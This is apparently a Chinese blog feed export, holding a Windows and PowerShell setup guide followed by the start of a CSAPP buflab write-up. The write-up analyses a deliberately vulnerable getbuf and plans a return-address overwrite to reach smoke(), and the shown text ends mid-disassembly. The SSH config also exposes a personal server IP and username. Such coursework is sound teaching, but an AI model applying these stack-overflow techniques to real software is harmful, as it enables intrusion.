potplayer<br></code></pre></td></tr></table></figure><ul><li>vscode</li><li>wiztree</li><li>geekuninstaller</li><li>zotero</li><li>rufus</li><li>ditto</li><li>teamviewer</li><li>sumatrapdf</li><li>filezilla</li><li>crystaldiskmark</li><li>crystaldiskinfo</li><li>foxmail obsidian  mathpix geekuninstaller snipaste quicklook potplayer</li></ul><blockquote><p>为了迁移方便，文件建议放在user文件夹中（Windows系统可以选择重装系统但是不删除用户数据，也即user文件夹中的数据）。而scoop的默认下载的路径就在user文件夹中，而不是<code>C:/Programe Files</code>。因此使用scoop安装可以便于系统迁移</p></blockquote><h1 id="pwsh美化"><a href="#pwsh美化" class="headerlink" title="pwsh美化"></a>pwsh美化</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装Oh My Posh</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">winget install JanDeDobbeleer.OhMyPosh <span class="hljs-literal">-s</span> winget  <span class="hljs-comment"># 方法2</span><br><br>scoop install main/<span class="hljs-built_in">oh</span><span class="hljs-literal">-my</span><span class="hljs-literal">-posh</span> <span class="hljs-comment"># 方法2</span><br></code></pre></td></tr></table></figure><p>在命令行中输入code $profile，会打开配置文件，在其中输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">oh</span><span class="hljs-literal">-my</span><span class="hljs-literal">-posh</span> init pwsh -<span class="hljs-literal">-config</span> <span class="hljs-string">&quot;<span class="hljs-variable">$env:POSH_THEMES_PATH</span>/M365Princess.omp.json&quot;</span> | <span class="hljs-built_in">Invoke-Expression</span><br></code></pre></td></tr></table></figure><p>保存，重启pwsh，发现报错</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">无法加载文件 C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\p</span>hilo<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\W</span>indowsPowerShell<span class="hljs-symbol">\M</span>icrosoft.PowerShell_profile.ps1，因为在此系统上禁止运行脚<br>本。有关详细信息，请参阅 https:/go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies。<br></code></pre></td></tr></table></figure><p>在管理员shell中更改策略为RemoteSigned</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-built_in">set-ExecutionPolicy</span> <span class="hljs-string">RemoteSigned</span><br><br><span class="hljs-built_in">get-ExecutionPolicy</span> <span class="hljs-comment"># RemoteSigned</span><br></code></pre></td></tr></table></figure><p>至此，Oh My Posh安装完成，可以通过Get-PoshThemes命令输出所有的主题</p><p><img src="https://img.gls.show/img/20230727201353.png"></p><p>但是，由于此时还没有安装字体，因此可能会出现图标显示不完全的现象</p><p>在如下网站安装字体，直接download即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.nerdfonts.com/font-downloads<br></code></pre></td></tr></table></figure><p>下载完成后会有一个压缩包，解压后进入文件夹双击文件即可安装字体</p><p>在pwsh的设置-》外观-》字体中，找到安装的字体，保存，重启pwsh即可</p><p>Microsoft.PowerShell_profile.ps1中写入了我们的主题，比如刚刚设置了M365Princess.omp.json作为主题，也可以换成其他的</p><h2 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h2><p>可以通过$psversiontable查看当前版本，我现在的版本是5</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">$psversiontable<br><br>Name                           Value<br>----                           -----<br>PSVersion                      <span class="hljs-number">5.1.19041</span>.<span class="hljs-number">3031</span><br>PSEdition                      Desktop<br>PSCompatibleVersions           &#123;<span class="hljs-number">1</span>.<span class="hljs-number">0</span>, <span class="hljs-number">2</span>.<span class="hljs-number">0</span>, <span class="hljs-number">3</span>.<span class="hljs-number">0</span>, <span class="hljs-number">4</span>.<span class="hljs-number">0</span>...&#125;<br>BuildVersion                   <span class="hljs-number">10.0.19041</span>.<span class="hljs-number">3031</span><br>CLRVersion                     <span class="hljs-number">4.0.30319</span>.<span class="hljs-number">42000</span><br>WSManStackVersion              <span class="hljs-number">3</span>.<span class="hljs-number">0</span><br>PSRemotingProtocolVersion      <span class="hljs-number">2</span>.<span class="hljs-number">3</span><br>SerializationVersion           <span class="hljs-number">1.1.0.1</span><br></code></pre></td></tr></table></figure><p>查找一下可用版本</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> winget search powershell</span><br>“msstore”源要求在使用前查看以下协议。<br>Terms of Transaction: https://aka.ms/microsoft-store-terms-of-transaction<br><br>是否同意所有源协议条款?<br>[Y] 是  [N] 否: Y<br><span class="hljs-section">名称                                 ID                                          版本         匹配            源</span><br><span class="hljs-section">---------------------------------------------------------------------------------------------------------------------</span><br>PowerShell                           9MZ1SNWT0N5D                                Unknown                      msstore<br>PowerShell Preview                   9P95ZZKTNRN4                                Unknown                      msstore<br>PowerShell to exe&amp;msi Converter free XPDCHZH119SRT8                              Unknown                      msstore<br>PowerShell Conference Asia 2015      9WZDNCRD37D8                                Unknown                      msstore<br>PowerShell                           Microsoft.PowerShell                        7.3.6.0                      winget<br>PowerSession                         Watfaq.PowerSession                         0.1.7        Tag: powershell winget<br>Windows Terminal Preview             Microsoft.WindowsTerminal.Preview           1.17.10234.0 Tag: PowerShell winget<br>Windows Terminal                     Microsoft.WindowsTerminal                   1.16.10261.0 Tag: powershell winget<br>PowerShell Preview                   Microsoft.PowerShell.Preview                7.4.0.4      Tag: powershell winget<br><br></code></pre></td></tr></table></figure><p>安装7版本的pwsh</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">winget <span class="hljs-keyword">install</span> Microsoft.PowerShell<br></code></pre></td></tr></table></figure><p>安装之后，原先版本和新版会共存</p><p>打开设置，将默认选项卡设置为pwsh7即可</p><h2 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h2><p>效果图：</p><p><img src="https://img.gls.show/img/20230726221250.png"></p><p>安装模块美化图标显示：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Install</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-variable">Terminal</span><span class="hljs-operator">-</span><span class="hljs-variable">Icons</span><br></code></pre></td></tr></table></figure><p>在$profile中写入配置</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">oh</span><span class="hljs-literal">-my</span><span class="hljs-literal">-posh</span> init pwsh -<span class="hljs-literal">-config</span> <span class="hljs-string">&quot;<span class="hljs-variable">$env:POSH_THEMES_PATH</span>/amro.omp.json&quot;</span> | <span class="hljs-built_in">Invoke-Expression</span> <span class="hljs-comment">#设置主题</span><br><br><span class="hljs-built_in">Set-PSReadlineKeyHandler</span> <span class="hljs-literal">-Key</span> Tab <span class="hljs-literal">-Function</span> MenuComplete <span class="hljs-comment">#补全</span><br><br><span class="hljs-built_in">Import-Module</span> Terminal<span class="hljs-literal">-Icons</span> <span class="hljs-comment">#美化图标</span><br></code></pre></td></tr></table></figure><h1 id="chrome插件推荐"><a href="#chrome插件推荐" class="headerlink" title="chrome插件推荐"></a>chrome插件推荐</h1><ul><li><p>Switch OMEGA</p><ul><li>轻松快捷地管理和切换多个代理设置</li><li>配合这个一同食用<a href="https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt">https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt</a></li></ul></li><li><p>adblock</p><ul><li>最佳广告拦截工具</li></ul></li><li><p>chathub</p><ul><li>同时使用ChatGPT, Bing, Bard和更多机器人</li></ul></li><li><p>onetab</p><ul><li>更好的标签页管理</li></ul></li><li><p>YouTube™ 双字幕</p><ul><li>自动切换到本地语言，双语字幕，字幕下载，字幕配音，自定义字幕样式。</li></ul></li><li><p>沙拉查词-聚合词典划词翻译</p><ul><li>网页划词翻译，支持多个翻译源</li></ul></li></ul><h1 id="Windows系统不可不知的快捷键"><a href="#Windows系统不可不知的快捷键" class="headerlink" title="Windows系统不可不知的快捷键"></a>Windows系统不可不知的快捷键</h1><ul><li>win+a，打开管理中心</li><li>win+d，回到桌面</li><li>win+L，锁定屏幕</li><li>win+方向键，分屏</li><li>win+m，最小化所有窗口</li><li>win+e，打开资源管理器</li><li>Shift + Delete：永久删除文件</li><li>Alt + D：选中地址栏</li><li>Ctrl+鼠标拖动：复制文件而不是移动文件</li></ul><h1 id="正版Windows系统安装"><a href="#正版Windows系统安装" class="headerlink" title="正版Windows系统安装"></a>正版Windows系统安装</h1><p>安装Windows一般有以下几个方式：</p><ul><li>在各大高校正版软件中下载【推荐】</li><li>在tb买激活码【一般只能装一次，十块钱左右】</li><li>破解版【不推荐，不安全】</li></ul><p>建议使用rufus制作系统启动u盘</p><p>关于win11蛋疼的必须联网和创建Microsoft用户才能进入系统的问题：</p><ul><li>绕过联网：shift+f10打开命令行，在其中输入OOBE\BYPASSNRO，电脑会自动重启，并且不会开机运行oobe（out of box experience）服务</li><li>必须创建Microsoft用户：把网线拔了就不会遇到这个问题</li></ul><h1 id="配置-github-git-ssh"><a href="#配置-github-git-ssh" class="headerlink" title="配置 github | git | ssh"></a>配置 github | git | ssh</h1><h2 id="本地git-ssh设置"><a href="#本地git-ssh设置" class="headerlink" title="本地git ssh设置"></a>本地git ssh设置</h2><p>首先下载<a href="https://git-scm.com/download/win">git</a>，之后在user目录下会有.ssh文件夹</p><p><img src="https://img.gls.show/img/20230727203941.png"></p><ul><li><p>known_hosts 存储已知的远程主机的公钥指纹。当首次连接到远程主机时，SSH客户端会将其公钥指纹保存在<code>known_hosts</code>文件中</p></li><li><p>这里wdnmd和zara是私钥</p><ul><li>为了安全的连接到远程，需要使用<code>ssh-keygen</code>命令生成公私钥对， 比如名称为<code>id_rsa</code>和<code>id_rsa.pub</code></li><li>我们需要在远程主机中的authorized_keys中写入id_rsa.pub的值，然后将id_rsa文件保留在我们本地的.ssh目录下</li></ul></li><li><p><code>config</code>是SSH客户端的配置文件，允许用户自定义SSH连接的行为和选项</p></li></ul><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">  Host github.com <span class="hljs-comment"># 设定主机别名</span><br>  Hostname ssh.github.com<br>  IdentityFile <span class="hljs-string">&quot;C:\Users\philo\.ssh\wdnmd&quot;</span> <span class="hljs-comment"># 私钥</span><br>  Port <span class="hljs-number">443</span><br><br>  Host zara<br>  HostName <span class="hljs-number">82.157</span>.<span class="hljs-number">64.229</span><br>  <span class="hljs-keyword">User</span> <span class="hljs-title">zarathustra</span><br>  IdentityFile <span class="hljs-string">&quot;C:\Users\philo\.ssh\zara&quot;</span> <span class="hljs-comment"># 私钥</span><br><br>Host *<br>    ServerAliveInterval <span class="hljs-number">180</span> <span class="hljs-comment"># ssh连接选项 使SSH连接的服务器保持活动间隔，表示每180秒（3分钟）发送一个保持活动的请求到服务器</span><br></code></pre></td></tr></table></figure><h2 id="github设置"><a href="#github设置" class="headerlink" title="github设置"></a>github设置</h2><p>在<a href="https://github.com/settings/keys%E5%8F%AF%E4%BB%A5%E6%B7%BB%E5%8A%A0ssh%E5%85%AC%E9%92%A5">https://github.com/settings/keys可以添加ssh公钥</a></p><p><img src="https://img.gls.show/img/20230727205401.png"></p><p>配置完这个之后，在命令行设置一下git邮箱和用户名，即可将仓库推送到远程</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">git</span> <span class="hljs-string">config</span> <span class="hljs-built_in">--global</span> <span class="hljs-string">user</span>.<span class="hljs-string">name</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment"># 设置 用户名</span><br><br><span class="hljs-string">git</span> <span class="hljs-string">config</span> <span class="hljs-built_in">--global</span> <span class="hljs-string">user</span>.<span class="hljs-string">email</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment"># 设置 邮箱</span><br><br><span class="hljs-string">git</span> <span class="hljs-string">config</span> <span class="hljs-built_in">--global</span> <span class="hljs-built_in">--l</span> <span class="hljs-comment"># 显示设置</span><br></code></pre></td></tr></table></figure><h1 id="安装VMware-tools"><a href="#安装VMware-tools" class="headerlink" title="安装VMware tools"></a><strong>安装VMware tools</strong></h1><p><strong>Windows下安装</strong></p><p>菜单-》虚拟机-》安装VMware tools-》蹦出来<code>D:\setup.exe</code>-》打开安装程序-》顺着安装程序一路点点点完成安装</p><p><strong>linux下安装</strong></p><ul><li>复制到桌面</li><li><strong>Ctrt+Ait+T</strong>快捷打开终端</li><li>tar zxvf 解压文件</li><li>进入文件夹，切换为root，./xxx.pl安装vmware tools</li><li>发现还是没法用，输入以下命令解决<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> autoremove <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools<br>sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools<br>sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools-desktop<br></code></pre></td></tr></table></figure>如果遇到运行上述命令失败，先运行apt update</li></ul><p>如果遇到问题：无法复制粘贴，并且重新安装VMware Tools选项显示灰色</p><p>解决办法：关机，设置里面添加软盘和cd，开机即可</p><p><strong>配置cpu数量</strong></p><p>Vmware核心处理器及内核数量相关概念：<a href="https://www.cnblogs.com/gambler/p/13227652.html">https://www.cnblogs.com/gambler/p/13227652.html</a></p><h1 id="安装Windows虚拟机"><a href="#安装Windows虚拟机" class="headerlink" title="安装Windows虚拟机"></a>安装Windows虚拟机</h1><p><strong>新建虚拟机</strong></p><ul><li>新建选项-》稍后安装操作系统-》分配CPU、内存等等一步一步点就行-》最后直接点击启动，会弹出一个窗口让你选择iso文件</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP-lab3：buflab</title>
    <link href="/p/db3828d1/"/>
    <url>/p/db3828d1/</url>
    
    <content type="html"><![CDATA[<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><blockquote><p>根据实验手册操作</p></blockquote><p>解压</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar xvf buflab-handout.tar<br></code></pre></td></tr></table></figure><p>得到三个文件</p><ul><li>bufbomb <ul><li>二进制炸弹</li><li>-h选项打印帮助信息</li><li>-u userid 运行，userid会改变一些代码地址</li></ul></li><li>makecookie <ul><li>根据id定制cookie</li></ul></li><li>hex2raw<ul><li>将十六进制数字转化为对应的ASCII码</li></ul></li></ul><blockquote><p>set disassembly-flavor att 转换为att格式的汇编</p></blockquote><h1 id="程序的基本分析"><a href="#程序的基本分析" class="headerlink" title="程序的基本分析"></a>程序的基本分析</h1><p>程序的运行方法：</p><p>Usage: ./bufbomb -u <code>&lt;userid&gt;</code> [-nsh]<br>  -u <code>&lt;userid&gt;</code> User ID<br>  -n          Nitro mode<br>  -s          Submit your solution to the grading server<br>  -h          Print help information</p><p>看一下保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; checksec<br>[*] <span class="hljs-string">&#x27;/home/kali/Desktop/bufbomb&#x27;</span><br>    Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      <span class="hljs-function">No <span class="hljs-title">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span></span><br><span class="hljs-function">    FORTIFY:  Enabled</span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><ul><li>“No PIE (0x8048000)”，这表示程序是以固定的基址加载到内存中的。地址0x8048000是程序的加载基址，也就是程序在内存中的起始地址。这意味着程序在每次运行时都会以相同的地址加载到内存中，而不是以随机的基址进行地址重定位。</li></ul><p>程序行为：</p><ul><li>BUFBOMB程序通过以下函数从标准输入中读取字符串<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-comment">/* Buffer size for getbuf */</span><br><span class="hljs-number">2</span> <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NORMAL_BUFFER_SIZE 32</span><br><span class="hljs-number">3</span><br><span class="hljs-number">4</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getbuf</span><span class="hljs-params">()</span></span><br><span class="hljs-function">5 </span>&#123;<br><span class="hljs-number">6</span>  <span class="hljs-keyword">char</span> buf[NORMAL_BUFFER_SIZE];<br><span class="hljs-number">7</span>  Gets(buf);<br><span class="hljs-number">8</span>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-number">9</span> &#125;<br></code></pre></td></tr></table></figure></li><li>此处存在缓冲区溢出</li></ul><p>If the string  is no more than 31 characters long, it is clear that getbuf will return 1, as shown by the following execution example:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">unix&gt; ./bufbomb -u bovik<br>Type <span class="hljs-built_in">string</span>: I love <span class="hljs-number">15</span><span class="hljs-number">-213.</span><br>Dud: getbuf returned <span class="hljs-number">0x1</span><br></code></pre></td></tr></table></figure><p>An error occurs if we type a longer string:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">unix&gt; ./bufbomb -u bovik<br>Type <span class="hljs-built_in">string</span>: It is easier to love <span class="hljs-keyword">this</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">when</span> <span class="hljs-title">you</span> <span class="hljs-title">are</span> <span class="hljs-title">a</span> <span class="hljs-title">TA</span>.</span><br><span class="hljs-class"><span class="hljs-title">Ouch</span>!:</span> You caused a segmentation fault!<br></code></pre></td></tr></table></figure><p>由于我们输入的字符串可能有不可见字符，TA贴心的提供了HEX2RAW帮你生成这类字符串。HEX2RAW程序的输入是很多个由两个16进制数字组成的字节</p><p>“012345” could be entered in hex format as “30 31 32 33 34 35.” (Recall that the ASCII code for decimal digit x is 0x3x.)</p><p>假设我们输入了：bf 66 7b 32 78，那么与之对应的：</p><p><strong>Raw Hex</strong> (zero bytes in bold):</p><p>BF667B3278   </p><p><strong>String Literal:</strong></p><p>“\xBF\x66\x7B\x32\x78”</p><p><strong>Array Literal:</strong></p><p>{ 0xBF, 0x66, 0x7B, 0x32, 0x78 }</p><p>Disassembly:</p><p>0:  bf 66 7b 32 78          mov    edi,0x78327b66</p><p>我们需要将此写在exploit.txt中，然后使用如下命令与bufbomb交互</p><ul><li>1、重定向程序输入</li><li>2、在gdb中给程序加参数</li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1.</span> You can <span class="hljs-built_in">set</span> up <span class="hljs-keyword">a</span> series <span class="hljs-keyword">of</span> pipes <span class="hljs-built_in">to</span> pass <span class="hljs-keyword">the</span> <span class="hljs-keyword">string</span> through HEX2RAW.<br><br>unix&gt; cat exploit.txt | ./hex2raw | ./bufbomb -u bovik<br><br><span class="hljs-number">2.</span> You can store <span class="hljs-keyword">the</span> raw <span class="hljs-keyword">string</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">and</span> use I/O redirection <span class="hljs-built_in">to</span> supply <span class="hljs-keyword">it</span> <span class="hljs-built_in">to</span> BUFBOMB:<br><br>unix&gt; ./hex2raw &lt; exploit.txt &gt; exploit-raw.txt<br>unix&gt; ./bufbomb -u bovik &lt; exploit-raw.txt<br>This approach can also be used when running BUFBOMB <span class="hljs-built_in">from</span> <span class="hljs-keyword">within</span> GDB:<br>unix&gt; gdb bufbomb<br>(gdb) run -u bovik &lt; exploit-raw.txt<br></code></pre></td></tr></table></figure><h1 id="level-0-Candle（10-pts）"><a href="#level-0-Candle（10-pts）" class="headerlink" title="level 0 Candle（10 pts）"></a>level 0 Candle（10 pts）</h1><p>test函数会调用getbuf函数，getbuf函数执行完之后会返回到test中继续执行。getbuf函数具有缓冲区溢出漏洞，我们需要劫持函数执行流，使得从getbuf函数返回到我们想要的smoke函数处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Buffer size for getbuf */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NORMAL_BUFFER_SIZE 32</span><br><br> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getbuf</span><span class="hljs-params">()</span></span><br><span class="hljs-function"> </span>&#123;<br>    <span class="hljs-keyword">char</span> buf[NORMAL_BUFFER_SIZE];<br>    Gets(buf);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br> &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> val;<br>    <span class="hljs-comment">/* Put canary on stack to detect possible corruption */</span><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">int</span> local = uniqueval();<br><br>    val = getbuf();<br><br>    <span class="hljs-comment">/* Check for corrupted stack */</span><br>    <span class="hljs-keyword">if</span> (local != uniqueval()) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val == cookie) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val);<br>        validate(<span class="hljs-number">3</span>);<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">smoke</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Smoke!: You called smoke()\n&quot;</span>);<br>    validate(<span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>smoke函数的地址为08048c18，因此需要将返回地址覆盖写为08048c18</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">disas</span> smoke<br><br><span class="hljs-attribute">08048c18</span> &lt;smoke&gt;:<br> <span class="hljs-attribute">8048c18</span>:<span class="hljs-number">55</span>                   push   %ebp<br> <span class="hljs-attribute">8048c19</span>:<span class="hljs-number">89</span> e<span class="hljs-number">5</span>                mov    %esp,%ebp<br> <span class="hljs-attribute">8048c1b</span>:<span class="hljs-number">83</span> ec <span class="hljs-number">18</span>             sub    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%esp<br> <span class="hljs-attribute">8048c1e</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> d<span class="hljs-number">3</span> a<span class="hljs-number">4</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">4</span>d<span class="hljs-number">3</span>,(%esp)<br> <span class="hljs-attribute">8048c25</span>:e<span class="hljs-number">8</span> <span class="hljs-number">96</span> fc ff ff       call   <span class="hljs-number">80488</span>c<span class="hljs-number">0</span> &lt;puts@plt&gt;<br> <span class="hljs-attribute">8048c2a</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,(%esp)<br> <span class="hljs-attribute">8048c31</span>:e<span class="hljs-number">8</span> <span class="hljs-number">45</span> <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       call   <span class="hljs-number">804937</span>b &lt;validate&gt;<br> <span class="hljs-attribute">8048c36</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,(%esp)<br> <span class="hljs-attribute">8048c3d</span>:e<span class="hljs-number">8</span> be fc ff ff       call   <span class="hljs-number">8048900</span> &lt;exit@plt&gt;<br></code></pre></td></tr></table></figure><p>getbuf函数的栈帧分配了0x38字节，buf的首地址在0x28偏移处，因此需要填充buf+old ebp大小的空间，然后将返回地址覆盖</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">080491f4</span> &lt;getbuf&gt;:<br> <span class="hljs-attribute">80491f4</span>:<span class="hljs-number">55</span>                   push   %ebp<br> <span class="hljs-attribute">80491f5</span>:<span class="hljs-number">89</span> e<span class="hljs-number">5</span>                mov    %esp,%ebp<br> <span class="hljs-attribute">80491f7</span>:<span class="hljs-number">83</span> ec <span class="hljs-number">38</span>             sub    $<span class="hljs-number">0</span>x<span class="hljs-number">38</span>,%esp <br> <span class="hljs-attribute">80491fa</span>:<span class="hljs-number">8</span>d <span class="hljs-number">45</span> d<span class="hljs-number">8</span>             lea    -<span 